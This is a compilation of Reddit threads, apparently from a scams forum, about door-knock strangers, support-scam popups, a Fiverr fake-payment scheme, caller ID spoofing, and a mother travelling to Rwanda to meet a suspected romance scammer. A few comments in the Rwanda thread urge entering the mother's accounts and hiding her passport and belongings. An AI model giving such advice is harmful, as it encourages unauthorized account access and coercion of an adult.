Maybe that‚Äôs what made me trust her more? She was apologetic and embarrassed to show up to a strangers house, which made me want to help her more. 

She asked me to call the police and I made a quick statement and so did she. 

I didn‚Äôt actually run into her ever again and wouldn‚Äôt even know the guy neighbor if I had saw him. 

It was also a rougher neighborhood, which honestly made me trust her more bc it wasn‚Äôt the kinda place ppl would just knock on your door. 

I suppose it could have gone bad under different circumstances (I was also an able-bodied twentysomething white dude- so that changes the calculus as well) but I was glad I could help.
- Never seen her before. I'd have mentioned she was familiar if she had been.
- It‚Äôs reckless to help someone in need? I don‚Äôt intend on going through life scared all the time , by all means you should live your life in fear and it sounds like you do. 

OP didn‚Äôt call 911 and instead let this person in, doesn‚Äôt sound like anything bad happened but still felt compelled to come to Reddit and make it into something it probably wasn‚Äôt.
- Unless of course you‚Äôre a female then don‚Äôt answer door and call police. 

I‚Äôm a man who knows how to take care of himself. I took a whole year of karate in second grade.

Admittedly, it depends on the soap used.
- I have an acute sense of smell and do find that people smell strongly after a shower, yes.
- I hear what your saying, and agree--tons of places to get free wifi. However, those options don't seem to be in play here.  Not paying the bill and taking out the sim card, if the phone has one, weren't mentioned.  It just feels like a script.

- My comment was to the person saying they were worried not **one** of their neighbors would recognize them if they needed help and banged on their door. 

But if u wanna hear my thoughts on your particular situation. I think it sounds very scary. I have no idea what that woman wanted or what her plans were. 

It seems like she wanted to either A) use your phone to transfer funds out of your cashapp/venmo/Apple Cash etc to herself or B) had other ppl laying in wait to do some kind of robbery situation? 

Idk the whole thing seems incredibly strange. I‚Äôd be staying on high alert for a little bit get some cameras if you don‚Äôt already. 

And next time if someone bangs on your door and you are not expecting anyone and are not 100000% certain it is a family member or someone you **know** and **trust**, just tell them (edit: through the door, do not open the door) ‚Äúdon‚Äôt worry I‚Äôm calling 911 for you right now they will be here soon to help you‚Äù and I bet they run away.

- In all honesty, I'm sure I would find it unnerving. But there's another aspect to these stories, it's an old lady. Wouldn't you call the police for a wellness check, if that happened and you didn't feel safe to respond yourself? Would you roll over and go back to sleep not caring what happens to maybe your neighbor?

And the girl who showed up, what should I do if this happens to me? I believe OP did what should have been done and took the chance. So far, as far as we know, no one has come back to murder or steal anything and maybe it was some young girl, not all that together, who just needed to use a phone.

In the 15 years I have lived in my neighborhood we've never had a problem more serious than a bike being stolen. What kind of places are everyone living? Is it that bad that the automatic assumption is, they're out to kill me? 

I'm not sure I could live like that.

In this world today, I see too many people who could help but don't. This is not going to be good for society in the longer run.

Title: How to stop Microsoft Support scams popping up while using Facebook in Chrome
Body: Hi,

My 80-something year old mom has to call me at least once a week to walk her through killing Chrome because her screen gets taken over by the typical Microsoft Support scam.  Up to date chrome and MS 11.  I've done all the normal things many times: erasing cookies and history, there are no extensions, she runs MS security stuff and I've  scanned using both Kaspersky and MalwareBytes (stopped using the former a couple of years ago).  She tells me she's not clicking on ads -- only reading articles and watching reels.

Looking for what else I can do to stop these from popping up. Long distance IT is a pain when someone can't even remember the 3-finger salute.

thanks

- Firefox + uBlock origin
- Try resetting the Chrome browser settings to default:

https://support.google.com/chrome/answer/2765944?hl=en&co=GENIE.Platform%3DDesktop
- Disable website notifications.   Or just put the hammer down per u/Faust09th suggestion.
- Does it have to be Chrome? You used to be able to block these malicious ads with Ublock, but Google has been screwing with Chrome and now it's a crapshoot whether Ublock will work at all. I migrated everything to Firefox + Ublock, and everything is a lot better.
- These pop ups are done using standard HTML, they don't come from an extension or a virus. It's basically just a pop-up window like many web pages have. An ad blocker can save you, however Chrome and related browsers like Edge have severely curtailed ad blocking extensions recently. As a result you might want to switch to Firefox or Opera. These aren't usually a problem on normal websites. You could also consider white listing just the web sites she needs. That would also help with her clicking on scam links.
- >there are no extensions

That's part of the problem. A good adblocker is important. And since Google is in the process of making them unusable, change to Firefox, using one there.

>when someone can't even remember the 3-finger salute.

Write it down, or make HER write it down. No remembering needed. And if she still keeps calling, maybe she just wants you to spend time with her.
- Add an adblocker extension ! Nowadays I use Ghostery. There are really a number out there , AdblockPlus was my go-to earlier.
- Stop using Facebook.  Problem solved.
- As far as I know, Facebook doesn't serve pop-up ads. Her problem is likely elsewhere, like malware installed from some other pages.
- There are a few virus/malicious installs that I saw doing this on my MIL laptop. We got two of them w Malwarebytes, and there still one stuck on there. Clearing default settings etc isn‚Äôt enough; it‚Äôs in there
- This happens for several reasons; either she's searching for websites instead of typing their addresses in the address bar and clicking on the first result, or she's mistyping the address by one or more letters. Least likely is the website was the victim of a drive-by attack. Facebook probably isn't the culprit. It's likely her habits.
- This.
- LOL, since my sister got a granddaughter I'm at my mom's at least once a week. I'm a good son!
- I didn't mean to imply otherwise.

Title: Ever heard of Eminexe Marketing?
Body: I applied for a job with Eminexe Marketing on Indeed for Client Sales Associate.  The called  with a recording giving me a number to call back their HR department. I didn't call back, because I never had a job have a recording call me, telling me to call them back for a job. I've only experienced that with telemarketer. They don't come up in a Google search or review. There are NO reviews about them online.I have to go back and check indeed to see if anyone has commented on them.  A real person called me today, and now I have a zoom meeting with her tomorrow. 

Have you heard of them? If you're experienced with checking out a company, can you do a little investigating for me? 

Update: I didn't do the meeting. School was delayed 2 hrs, and I had another appointment, so I just dropped the zoom. It's probably for the best.

They do if you search for "eminexe marketing" but not if you only enter "eminexe" which is a little strange but there it is. It might have something to do with the site being very young, just 5 months old.
- It could be a r/devilcorp

Title: Reddit Artist / Writer Unsure if using AI for contract
Body: Hello, 

I just closed a contract with a *writer* who is also a digital artist. I noticed something strange when receiving some of their writing, final works would be structured as an AI would be. I ran the work through some free AI detection tools, but I'm unfamiliar with which tool is the most consistent / best indicator. 

The work itself works for what I requested, but I don't need to pay someone to have them end up using an AI. 

This person's Reddit account is also only a year old which to me is a red flag. How can I go about determining if this person is legit?

- for the writing, you can ask for the edit history. If it was all just pasted in chunk by chunk, it's ai generated. If they start making excuses about not having the history, that's highly suspicious.
- AI detectors can give false positives at times. The best way would be to ask them to use Google Docs while writing, alongside a tool like GPTZero's Origin Chrome extension which records a replay of the writing, time spent on the document etc, and gives an analysis of the writing patterns to verify if it is indeed human-written.
- Thanks. I requested edit history and got some notes in bullet points that were not associated with the final work. The notes were exploratory. I worry though because most text AI detectors show high chance of AI use...
- those tools *can* to give false positives, especially with flowery or formal language
- Of course. I'm trying to avoid cancelling a contract prematurely but at the same time I want to be sure I'm not getting someone using just AI. 

Fortunately their artwork appeared to check out from the image detectors. So that's a good sign

Title: is this real in fiverr?
Body: Guys, I need your help, a guy called me on Fiverr asking for my video editing work, I answered him and then he told me to call him on his WhatsApp. After calling him, he asked if I could do any of the work he had, I chose video editing and then he sent me a series of logos created with AI asking me to animate them and offering me a value of 3,988 dollars which will be paid via paypal or bank transfer. I'm afraid it's a scam because in addition to his account being new, he's offering me a VERY high amount. If it is a scam, how should I proceed?

- Anyone that takes you off platform is trying to steal from you.

No one pays that much for that type of work. This will end up as a !fakepayment scam. They're relying on your sunk cost fallacy to kick in since you've done a bunch of busy work by that point.
- >If it is a scam, how should I proceed?

By not doing it. 

Offering too much money and wanting you to go to WhatsApp are huge red flags.

Often with scams like this, they'll wait until you've done all the work and then they'll come up with a reason that you need to give them money to receive your payout. They're betting on you thinking "well I don't want to have done all that work for nothing, and sending them $50 to get almost $4000 seems like a good deal..." but you'll never get any money from them.
- You went off Fiverr to whatsapp. Therefore, it's a scam.

In this case, they will require you to pay them to unlock your pay.
- Not only is this a scam, but discussion off platform before an order is placed is against Fiverr's TOS and could get you banned.  The scammer may already be banned for doing this, or will be soon.
- If they want you to go to Whatsapp or Telegram be sure that they're scammers, just ignore and report them
- > A guy called me on Fiverr‚Ä¶ told me to call him on WhatsApp. After calling him‚Ä¶

WHY? Fiverr has a shit ton of warnings saying never ever communicate outside the platform. You forfeit all your protections.
- It's a scam. Block, ignore and delete...
- They took you off platform and are offering you more money the. It‚Äôs probably worth. Definitely a scam
- Got as far as WhatsApp and stopped reading.  Taking it off site and wanting to use whatapp...scam.    ignore, block and delete
- If you do a search in the sub, you will find innumerable fiverr scams. They start with taking you off platform, like yours, and from there can go in several different ways. One common one is requesting your email then sending you a fake email that ends up with you sending them your account details and getting your account drained. I suggest you do your own search. Here is one example. 

https://www.reddit.com/r/Scams/s/vIJK5hNqej

And another

https://www.reddit.com/r/Scams/s/DYK9GeoxV6
- also a , is a decimal to some cultures so you could end up with four bucks for your time.
- It's also a weirdly specific dollar amount. Why not $4k? Why not $3.5k?
- Have you wondered why he asked you to move over to Whatsapp? It's not needed. That's to move you off platform where y'know you lose all protection. Hmmm I wonder why he would want that?

It's a scam and you should never move off platform when dealing with internet randos. There is no reason to.
- Yes it's a scam. No real person uses the phrase "bank transfer", nor do they pay some rando they just met so much money for this type of work, nor does a professional company or person operate through Whatsapp

Block and ignore them
- who's going to say this for all of those that are doing artwork and getting offered money This is the procedure for making sure you get paid legitimately 

You first sent them a contract and you agree what's going to be done the scope of the work and you have them sign it and you verify their identity with the legal identification 

Once you're done that you're specify when and where they can expect to get their work done and you ask for a deposit of 1/3 down none negotiable and none refundable. 

Once you get a third of that money it's been cashed it's not been reimbursed and it's guaranteed in your hands then you proceed to do the work and you finalize the payment and you show them some versions of the work before you give them the work and once they get the work and once they have seen the work and approved and paid you then you submit the work to them 

If they're offering to pay you forget it you want 1/3 of that money or 50% upfront and then the rest when you're finished with a contract
- This is 1,000 % a scam. Run bro
- It‚Äôs a scam. Block them immediately.

It‚Äôll be like the !muse scam
- Scam.
- Ask for $500 deposit up front to start work via zelle and watch the excuses.
- OP she is correct. Yes, this is a scam run it‚Äôs not worth the headache
- Hi /u/CIAMom420, AutoModerator has been summoned to explain the Fake payment scam.

The fake payment scam occurs when someone tries to trick you into thinking that you have received a legitimate payment when no such payment has been made. The most common method they use is sending you an email meant to look like a payment confirmation. In some cases the emails will be almost indistinguishable to a legitimate email sent by the payment service. Scammers are known to also show you screenshots instead of an email. Never trust a screenshot a stranger shows you, because it is probably doctored.

Scammers [spoof](https://en.wikipedia.org/wiki/Email_spoofing) the 'from' email to match an official address, and make you think you received a legitimate email. To combat a fake payment scam, verify online payments by logging in directly to the service. Do not check your junk folder, and do not assume a payment is legitimate based on an email alone. If a payment isn't reflected on your account and the person you are dealing with insists they have sent it, call support and ask about it. [Here](https://i.imgur.com/X9xn8uw.jpg) is an image of a scammer trying to pull off a fake payment scam. There is also a variant of the fake payment scam where you will receive a legitimate but fraudulent payment.

A variant of the fake payment email is just an advance fee scam: the scammer tries to convince you that your funds are on hold, and that you have to upgrade your account by sending the scammer some money to authorize the payment. No payment processor works like this. If you think you're dealing with a scammer, you're probably right. Always trust your gut.


**
- Yes very true.
- Report them for asking to contact you off platform,¬† just don't include that you did so.
- ok man, thanks!
- Guess you are in the US, as a bank transfer is a totally normal way to pay someone outside the US. There you have to use stupid apps that take a cut just to send money to your friend, but thats not the case everywhere.
- Hi /u/still-at-the-beach, AutoModerator has been summoned to explain the Muse scam.

The muse scam is a variant of the [fake check scam](https://consumer.ftc.gov/articles/how-spot-avoid-report-fake-check-scams) in which the scammer will contact the victim over social media and claim to want to use their image for an art project. The scammer will often use a stolen social media account to increase their credibility. They will offer a generous sum of money and offer to pay via check, and the victim is instructed to send money to the scammer for ‚Äúmaterials‚Äù via an irreversible method. The victim is under the illusion that the funds cleared when the bank makes the money available thanks to current regulations. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months.

If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. You can summon the fake check automoderator explanation using the trigger fakecheck. Thanks to redditor aNeatHat for this script.

This is a scam where a scammer impersonates an artist. For the scam where a scammer targets artists, call the automoderator trigger (artist)

Title: Caller ID came up as "Public Service". Is this a scam?
Body: Previous post was removed for being too short. Not a whole lot to tell here but I'll try. I was on a phone call when another call came through. Caller ID said "Public Service". I've never seen a call with that ID before.  I ignored it and continued with my original call. 

After I finished my call I went back to check my phone app. They didn't leave a message (wasn't too surprised) but the odd thing is, the call was not listed on my list of recent calls. I've never had that happen before. I'm not the brightest bulb in the box but I know enough to not answer calls unless it's a number I recognize. I just wait and check for messages and if there is none I just block that number. But I've never had a call not listed in my list of recent calls. A quick Google search indicated that calls with that ID could be legitimate but are also a  popular tool for scammers. Two questions: 

Has anyone ever answered one of these and have it turn out to be a scam call? Or for that matter, a legit call?  And If legit, what was the nature of the information that the "public service"  was trying to share?

The part I'm most curious about is why it didn't show up on my list of recent calls. Has anyone ever had that experience, either with a scam call or one that is legitimate? 

Hope this is enough information to assure the screening bots and the mods on this sub that I am a real person with legitimate question. Been on Reddit for 5 years and would think I have sufficient karma to show that I'm legit.

- Scammers can spoof just about any number, including official government phone numbers and numbers that are in the Caller ID Name (CNAM) database (a way that the caller's name can appear on the caller-id display even when that number is not in your contacts). If a scammer spoofs a phone number that is in the CNAM database as "Public Service", it is still a scam caller.

Title: My mum has booked a plane ticket in 3 weeks to meet her scammer
Body: Looking for more information on similar scams to the one my mum seems to be involved in. We can't find any scams that seem to be the same and I want to be able to show her some examples to help her understand.

Story: My mum (60F) came over to my place on the weekend to tell my brother and I about some "exciting news". She told us that she is heading to Rwanda in 3 weeks to meet her friend (32M) from Nigeria. Obviously alarm bells start going off for all of us straight away.

My mum has been divorced for about 5 years, lives alone but deals with a lot of health issues to the point she no longer works. She is quite easily manipulated and can be very naive. She received quite a big pay out from her divorce. She has never traveled overseas alone and has never planned a trip by herself.

She told us that they met on instagram 4 years ago. Very quickly they started video chatting for hours each day. He has told her the story that he works in stock trading/crypto and travels all over the world, he had a young son who died of a brain tumour 2 years ago and he has no other family.

He tells her that she is smart, funny, all that sort of basic scammer stuff. They had agreed to meet in Rwanda as he claims Nigeria is not a safe country and he is looking out for her. 

When she told us what she was going to do, she said that she had set up a video chat with him for us to meet him, so that we could see that he was a real person and everything was ok. We jumped on the call and it was so obvious this guy is a scammer, however I found it interesting that he is happy to video chat with his real face, as most of the examples I can find online always say they make excuses for why they can't talk on video. 

I asked him questions about what activities he had planned for him and my mum when she arrives and he couldn't give me any basic answers. I asked him if he had booked a hotel to stay at and he told me not to worry about that. I asked if he had any romantic interest in her and he said no of course not, which I found odd as she had told me earlier that she was hoping it would be romantic. I thought this might set off alarm bells for her, but of course nothing.

She is obviously very smitten with him and believes every excuse or explanation he has for all the red flags. I commented that it was odd there were no photos of his son on his house, she said "oh well he only just moved in there".

Just looking for advice or similar stories of people who have been scammed this way. I am trying to figure out the end goal of luring her to Rwanda? She claims he has never asked for any money from her, I don't necessarily believe this but let's assume she's telling the truth. I am sure he knows all about her divorce payout. I'm worried about the amount of personal information she's fed him about my family and I. 

After a pretty harsh conversation she is still set on going, time is running out to stop her and I refuse to financially support her if (when) it all goes pear shaped. Any advice is welcome.

You should sit down with her and have an earnest conversation about her finances specifically involving this man. If she is sitting on a large sum of cash there is a very good chance she has already been sending him money.
- I strongly suggest you don't let your elderly mom travel alone to Rwanda. Just don't. There's a very real possibility she won't come back. Scammers almost never want to meet their marks, that defeats the whole point. There's a very real possibility of her being robbed, kidnapped, or killed. There's just no way this can end well.
- This happens often with !romance scammers where the victim plans on visiting them and even spending money on tickets but then the scammer ghosts them. There are stories of people sitting in airports for hours waiting for their scammer to meet up with them, people having to get a hotel to stay at and wait out until their return trip home, etc. Then the scammer will message them again months later apologizing with fake stories of why they didn‚Äôt show up and ask for more money again.

One thing you can check is if she bought actual tickets. She may have given him the money to buy them for her, which means the tickets don‚Äôt actually exist, or he could have suggested a website for her to buy them from which is a fake site he runs, which also means the tickets don‚Äôt actually exist.
- If he travels all over the world, there is no reason he can‚Äôt come to her instead of her going all the way to Rwanda. She should offer to meet him some place safer and more enjoyable that was she can have a decent vacation after he stands her up.
- Honestly I don't know how the adult children in these situations resist just reporting all their parent's credit cards stolen and changing their passwords on every social network. It must be incredibly frustrating to see the person who raised them trusting a random scammer who they've never met over their own kids.
- In this instance, the scammer has revealed his real identity. This can happen for several reasons. 

One of them is that they start off lying but realise that the victim can provide more than a few gift cards if they confess and move onto Plan B: make a white friend. 

The other is if they were caught lying, and rather than run from the victim by blocking them, they attempt Plan B. 

The third is that they always appeared with their own identity. Facebook is filled with Nigerians innocently asking for friends or financial support  (weird how they are usually seen in groups for widows though) 

It seems unlikely that he has devoted four years to a woman twice his age who has never sent him any money though. That‚Äôs not what Plan B is for. 

Even if this is real and he is a cryptocurrency trader who is wealthy and doesn‚Äôt need your mother‚Äôs money- you have to wonder why he is agreeing to meet her in Rwanda of all places rather than Dubai or New York. Why can‚Äôt he come to where she lives for that matter?

In order for him to get to Rwanda himself, he would have to go through Cameroon, the central African Republic and the democratic Republic of Congo. None of them particularly advisable for first time, female solo travellers, and nor is Rwanda  itself particularly known for elderly white lady tourism.

I don‚Äôt think I‚Äôm being overly dramatic to have concerns about kidnapping /ransom or having her passport taken to pressure her into financial support. 

All of it sounds extremely sketchy.
- See if you can find her passport OP and take it. It would be incredibly dangerous for her to go to Rwanda
- There's a very real possibility that she will be kidnapped and held for ransom in Rwanda. Do your utmost to prevent her going.
- If the scammer has invested 4 years in her, he may be thinking of a green card. I have a coworker who met some guy from Africa on a gaming app. He's a lot younger than she is, and she immediately started sending him money. She went to meet him in person and got married a few days later. Now she sends him more money and he is frequently mad at her because she hasn't come up with the money to get his green card. She's seen him one time in 3 years
- She has health issues so bad that she can‚Äôt work, but she can travel to the other side of the world?
- The crypto part is in it self a scam, and in 4 years he probably has gained a nice chunk.from  her.

Rwanda is no place for a first time  traveler for a solo older woman. Just the poverty will be a shock for her most likley, ranked in place 161 out of 193....

If it wasn't for the crypto, central africa is not an unusual place for old white women to find younger men that want a new life in the west.
- Wow i stay next country to rwanda ,i tell u now scammers r everywhere and its unsafe plz tell not to fall for this its scam
- Hide her passport.  Don‚Äôt let her go there alone!  If she has a ‚Äúfoggy brain‚Äù.,as you say, she will be in great danger.  All types of scamming, particularly romance, are a regular business in Nigeria, Ghana, India and other places. 

 Even if he doesn‚Äôt show up, she will be in danger from being confused and vulnerable.
- Something that worked for our friend was to inundate the victim with documents.  Prepare a POA, and all of those medical permissions forms.  Draw up a will that could force them to face some realities.  Next, get a vaccination schedule, complete with costs and timeframes.  Funeral arrangements.  Inspect their travel documents such as visas, passport expiration dates, etc.  Get added to their bank accounts (how else would you be able to send them money).  

In other words, confront them with life facts that helps them face the permanence, finality, and any impacts that you can think of.  

Discuss how they can make their return travel arrangements if there is nobody at the other end to provide housing, transportation and a future.  I have to believe the scammer is asking them to bring money in some form so discuss the legal limits.  See if the legalities and end of life discussions make them rethink this plan.
- You often hear stories of family members trying to convince their family they are being scammed and that information being rejected.

I wish you the best of luck but also if it comes down to it I would 100% hide your mom‚Äôs passport. Don‚Äôt take it just in case it becomes a bigger thing, but hide it somewhere she can‚Äôt find it in her home. Do not let her go on her own to Rwanda. She‚Äôll be so vulnerable. 

Odds are this is just a typical financial scam but better safe than sorry.
- This kind of sounds like a romance scam that I got caught in in my younger days.  Met a woman online who lived in  Europe.  We chatted online and did video for more than a year before I flew over and met her.  She was real and very nice.  After this trip I really started thinking that maybe it would work!  But at this point I think she could sense I was getting hooked and that was when the money requests started coming in!  Then, when I was hesitant in paying,  she started getting upset and wasn‚Äôt as friendly.  Fortunately it ended really quick when I wasn‚Äôt forthcoming with the money.  But I noticed that it was only once she felt I was getting emotionally invested, that she became real strong with the money requests. 

She was nice and very good looking, but I couldn‚Äôt really figure out how she supported herself.  She said she was on unemployment and didn‚Äôt work.  In the end, based on some little things she said, I started to think that she spent a lot of her time online trying to meet guys and then eventually get money from them.

It turned out ok for me I guess!  I got a trip over to europe where she showed me around and for a time I had a very nice looking european ‚Äúfriend.‚Äù  (We were very chaste. We kissed, but that was it and there was no other online sex talk).  But it could have gotten real expensive, real fast!

Some of the scams I read about here are described as organized scam operations where the ‚Äúwoman‚Äù is really a guy.  But I think there are some ‚Äúindependent operators‚Äù (i.e. just regular people who use their looks or charm to find sugar daddies online on their own).  Because they are real people it‚Äôs not a total scam, but they are primarily interested in your money.

ETA: Also, I was a healthy young man at the time going to a safe western european county.   I would have never traveled to Rwanda solo to meet an online friend.  That would be unbelievably unsafe! (It‚Äôs not african countries are unsafe. My parents lived in Nigerian for a few years doing missionary work.  But western europe is more familiar and everyone speaks english and there a lot of other american travelers around that I‚Äôve met).
- The scammer probably already has most of that divorce money.
- I saw a youtube recently where a similar thing happened. They guy flew to a south american country and the girl was real but it was all a con and she was collecting money from a lot of different men. 

I think the scammers are now quite open with showing their faces - they are providing companionship and getting money in return and there's nothing illegal about that. 

She's obviously been sending him money or he wouldn't still be there. When she gets there, he's going to lead her on and get more money out of her. You have no idea how much money is already gone.
- It makes zero sense for someone in Nigeria to go to Rwanda to meet someone. Look at the map, they are 2500 miles apart. That's roughly the same as New York to San Francisco. You have to fly, even if you wanted to drive there is a lot of war torn land in between, particularly the DRC.

If the scammer is gonna fly why not go somewhere more stable than Rwanda, like Tanzania, Kenya, South Africa or Europe.

I hope your mom listens.
- OP, Google Donna Nelson and show your mum the story.
- OP, I'd agree with the person who said you should hide her passport. That's the best thing you can do, talking some sense into her won't work,unfortunately.

Alternatively, tell her the only way you'd let her go alone is if she lets u travel with her. She should pay for it.
- She's paid for the tickets, so you won't get that money back anyway.

Before she departs, hide her phone, hide her luggage and disappear for a day or two.

Talking won't work at this stage, you have to actually get your hands dirty and stop her flying.
- My mom was pretty lost after twenty-four years of marriage ended. She went to India to meet her online boyfriend. He had a wife who he was not going to leave. My mom was still there for three years. 
I had tried to stop her from going, but they are grown ass adults. It‚Äôs so frustrating.
- There was a lady that did like your mom and met them. The guy met her but then they decided to go to china?  The grandmother got arrested in a different country with the scammers.
- OP, has your mom been ‚Äúinvesting‚Äù with him??? 

Also he‚Äôs not afraid to use his real face because what are they gonna do, extradite him for a scam? He‚Äôs just not doing the catfish part of the scam.
- I only skimmed this but three likely scenarios 1) she gets there, and no one meets her. She gets ghosted. 2) think 90 day fianc√©, the show. 3) she gets trafficked.
- Digging back into a previous life I had................There is no way in hell she should make this trip. The guy ticks all the boxes as being not just a scammer, but as the kind of person she should avoid at all costs. He found the perfect mark: older, white, unmarried, and probably lonely. These guys are more than just manipulators; they are sociopaths. They can figure out what a person's vulnerabilities are, what they most want and need to hear to feel good about themselves, and exploit those vulnerabilities. She is absolutely being setting up, and the best thing that will happen is that she is going to lose a lot of money; maybe everything she has. Worst case is that she will never be seen or heard from again.

As another person already commented, why Rwanda? If he's so damn rich, meet him in Dubai or Doha.
- My ex-sister-in-law (early 50s maybe) got caught up in a romance scam with someone in Cairo.  I don't know if she sent him money ahead of time but she cashed out all of her assets (admittedly not all that much but she had fairly recently received a small inheritance) and flew to Cairo to meet him.  He told her at the airport that she should give him all her money and any other valuables to hold because it was safer, so she did.

She ended up locked in an apartment for two weeks before she was able to grab her phone and get out. She never saw her 'sweetheart' again after he got her into this apartment and left her with two people she didn't know.  In a very, *very* lucky coincidence, I knew a lady that lived in Cairo from a forum I used to belong to so I contacted this lady asking for advice.  I was in contact with sister in law through my ex on the phone while in DMs with Cairo acqaintance. She asked me to ask sister in law for landmarks so she could get an idea of just where she was in the city. She gave me a couple numbers for her to call (one was sort of a women's help line) and also told her to get to the embassy if she could.

It actually gets even more stupid after that because this scammer wasn't the only person on FB that sister in law was in contact with, she had someone else lined up and she contacted him instead and he flew her to where he was which I don't remember now, somewhere in the vicinity of Egypt. I think it might have been Tunisia. He had a horse ranch and sister-in-law was a lifelong horse person. That didn't work out either but at least his intentions weren't horrible and she ended up being repatriated to the US by the embassy wherever she was and turned over to her daughters.

It could have turned out much, much worse and we're glad it didn't.  Your mom should not do this thing, I hope you can talk her out of it.  Before the Cairo mess, sister-in-law had a nice apartment, a nice car and some money.  Now she's in a subsidized low income apartment through the state, no car, no money and her daughters are in very low contact with her.  iirc, one is completely  no contact.
- if this guy is rich, just have him fly out very suspicious that someone who‚Äôs rich needs someone else to fly to him! right right there the red flag if he can travel all over the world, he can travel to meet your mom. tell your mom unless she wants to lose all her money don‚Äôt go to meet him. Have him come meet her and you
- She has already given this guy money. Have a look at transactions & contact financial institutions to protect whatever might be left. We have a family friend who was scammed for a LOT. She prides herself on being this insanely honest person, but the scammer had convinced her that the money she was shelling out was private & NOBODY'S business. She bought it, & lied through her teeth at every opportunity, because she didn't want the relationship to be questioned or taken away. I don't get why it works so well, but I'm here to tell you that it definitely does. Check her accounts. And do whatever you can to stop the trip. I understand how impossible this seems. But the sooner, the better. When we were finally able to get her to realize that he was a young scummy guy working in a big room full of other scum, not a widower, she was exhausted & her heart was broken. And you know what? Her personality was still exactly the same. It could happen again. She's the perfect mark. It sucks.
- Others have said it but your mom may be KILLED if she goes. You need to be blunt about it. Do not let her go. You have to do anything to stop her. Hell, cancel her ticket and book a flight for you and her somewhere else. Get her out to places for seniors to meet. Hobby clubs, etc. She is lonely enough to travel to Rwanda to meet a stranger, please help her find happiness (not necessarily a relationship) so she won‚Äôt keep looking for it in the wrong places.
- Omg, if I could help I would buy you a ticket just so you will tell her at the arrival that she was scammed. 

He will say that he couldn't manage to come as he broke his car and needs help as he "forgot" his wallet.
- Go on YouTube and search ‚Äúthe cocaine buttons‚Äù. Is a real story of this woman who was duped into carrying drugs internationally. It is common for scammers to use victims to carry drugs to other countries ‚Äúdrug mules‚Äù especially white women from first world countries that may not raise as much suspicion. This woman was arrested in Hong Kong and spend quite some time in jail. The scammers met with her and then gave her some dresses in a suitcase. She checked the suitcase to be safe and found nothing so she didn‚Äôt think much, well, the buttons of the dresses were filled with drugs. She was caught and arrested. 

Your mother is being incredibly irresponsible. She is going to a country she knows nothing about to meet some stranger from the internet. Best situation here he never shows up and gives some bad excuse, worst case she is sent to prison in some foreign country for drug trafficking.
- did you image reverse-search the images?   
if you feel she is mentally incapacitated you can file for power of attorney ?  
you can all her bank and tell them she is being scammed and ask for help, doubt that they care but maybe they do.

do you have any other family ? maybe like an intervention. 

this could be real but its not safe to be in that part of the world with health issues  
there is a travel advisory for rowanda right now. [https://travel.state.gov/content/travel/en/traveladvisories/traveladvisories/rwanda-travel-advisory.html](https://travel.state.gov/content/travel/en/traveladvisories/traveladvisories/rwanda-travel-advisory.html)

  
have you made it clear to him that she has nothing ?  
personally I would get into her accounts and block and block and delete and make it impossible for him to find her again, set up "child" locks  to prevent access.

- You have two options:

No matter fucking what, don‚Äôt let her get on that plane.

Or, the much more sinister option is tell her she can go if she lets you take out a million dollar life insurance policy with you as the beneficiary. (To really drive home how dangerous it is).
- Here's a post from just a few days ago from someone whose mother is in the same hole, but has gone farther into it. 

[https://www.reddit.com/r/Scams/comments/1i4g6j6/mom\_involved\_in\_relationship\_scam\_is\_this/](https://www.reddit.com/r/Scams/comments/1i4g6j6/mom_involved_in_relationship_scam_is_this/)

There are some useful comments. Apparently, some of these scammers are experienced enough to be willing to show up on video and even in person. There's a better-than-zero risk that she will get mugged, robbed, or coerced into turning over her money once she's there. You might contact the Rwanda consulate or embassy to see if they can help catch this guy. 

It's good that you and your siblings are onto this scam and no one is saying, "Let her do what she likes, it's her life." Do what you can to protect your finances and, if possible, her assets. E.g., is her home mortgaged? Can you convince her to put one of you on the deed so that transactions need 2 signatures?
- This is a ***classic romance scam*** with some twists, and unfortunately, your mum is likely caught in it. Here's a breakdown of what's likely happening and the scammer's potential goals:

##**The Scammer's Tactics**
 **Grooming:** The scammer has spent four years building trust and an emotional connection with your mum. This is a long game, designed to make her feel loved and special, lowering her defenses.


 **Typical Scammer Profile:** The story he's woven (successful trader, tragic past, etc.) is designed to evoke sympathy and make him seem both desirable and vulnerable.


**Video Chatting:** This is where it gets interesting. Most romance scammers avoid video calls. This scammer may be using deepfakes or someone else to impersonate the person in the photos. This adds a layer of "legitimacy" and makes him seem more real.


 **The Rwanda Trip:** This is highly suspicious.  
He's likely trying to: **Isolate her:** Getting your mum away from her support network (you and your brother) makes her more vulnerable to manipulation.

   **Gain further trust:** Meeting in person could solidify the relationship in your mum's mind, making her even more susceptible to his schemes.

   **Set up the next stage of the scam:** This could involve anything from getting her to invest in a fake venture to compromising her personal information for identity theft.

##**Possible End Goals**
Even if he hasn't asked for money yet, the scammer likely has a financial motive. Here are some possibilities:


**Money Transfer:** Once she's in Rwanda, he may fabricate an emergency (he's been robbed, he needs medical care, etc.) and pressure her to send money.


 **Investment Scam:** He might lure her with a "can't-miss" investment opportunity, likely related to crypto or stocks, given his fabricated background.


 **Blackmail:** He could try to compromise her in some way (e.g., secretly filming her) and then blackmail her.


 **Identity Theft:** He may use the personal information she's shared to steal her identity or open accounts in her name.


 **Human Trafficking:** While less likely, it's a possibility that should be considered, especially given her vulnerability and isolation.


##**What You Can Do**

**Gather Evidence:** Document everything ‚Äì messages, photos, videos, etc. This could be helpful if you need to involve law enforcement.

 **Show Her Similar Scams:** Search for romance scams involving travel or those that use video chat. The FTC and other consumer protection agencies have resources.

 **Emphasize the Risks:** Explain the dangers she's facing ‚Äì financial ruin, identity theft, even physical harm.

 **Contact Authorities:** Report the scammer to the FBI's Internet Crime Complaint Center (IC3) and consider contacting the US Embassy in Rwanda.

 **Seek Professional Help:** A therapist or counselor may be able to help your mum understand the situation and break free from the scammer's influence.

 **Stay Supportive:** Even if she goes to Rwanda, let her know you're there for her. If things go wrong, she needs to know she can turn to you for help.

It's crucial to act quickly. The closer it gets to her departure date, the harder it will be to change her mind.  Good luck, and I hope your mum stays safe.

https://www.fbi.gov/scams-and-safety/common-scams-and-crimes/romance-scams
- I'm African. This is a scam. They will milk her dry. She needs an intervention omg. So sorry üòû
- Not giving him money does not necessarily mean he hasn‚Äôt convinced her to ‚Äúinvest‚Äù her savings in his crypto investments already OP.
It‚Äôs easy to manipulate words so it doesn‚Äôt sound as though he has had lots of her cash already.
